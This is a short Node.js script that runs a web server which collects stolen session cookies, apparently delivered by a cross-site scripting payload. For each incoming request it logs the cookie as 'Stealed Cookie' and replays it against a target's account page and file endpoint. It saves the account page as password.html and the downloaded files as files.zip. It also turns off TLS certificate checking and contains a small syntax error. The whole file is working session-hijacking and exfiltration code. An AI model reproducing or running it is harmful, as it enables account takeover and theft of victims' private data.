
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
var request = require('request');
var fs = require('fs');
var http = require('http');
var url = require('url');
var AdmZip = require('adm-zip');

http.createServer(function(req, res) {
	res.writeHead(200, {'Content-Type': 'text/html'});
	res.write('You have been hacked!');
	var url_parts = url.parse(req.url, false);
	var query = url_parts.query;
	console.log('Stealed Cookie:' + query);


var options = {
    url: 'https://xxxxx:xxxx/account',
    headers: {
        'User-Agent': 'request',
		'Cookie':query
    },
	followRedirect:true
};

function callback(error, response, body) {
	fs.writeFile("password.html", body, function(err) {
			if(err) {
				console.log(err);
			} else {
				console.log("The file was saved!");
			}
		}); 
}
	
request(options, callback);



var options2 = {
    url: 'https://xxxxx:xxxxx/file,
    headers: {
        'User-Agent': 'request',
		'Cookie':query
    },
	followRedirect:true
};

function callback2(error, response, body) {
}
	
request(options2, callback2).on('response',function(response)
{
	var data = [], dataLen = 0;
	response.on('data', function(chunk) {
					data.push(chunk);
					dataLen += chunk.length;
				}).on('end', function() {
					var buf = new Buffer(dataLen);

					for (var i=0, len = data.length, pos = 0; i < len; i++) { 
						data[i].copy(buf, pos); 
						pos += data[i].length; 
					} 

					var zip = new AdmZip(buf);
					zip.writeZip("files.zip");
				});		
});




res.end();
}).listen(3000);
console.log("HTTP server is listening at port 3000.");
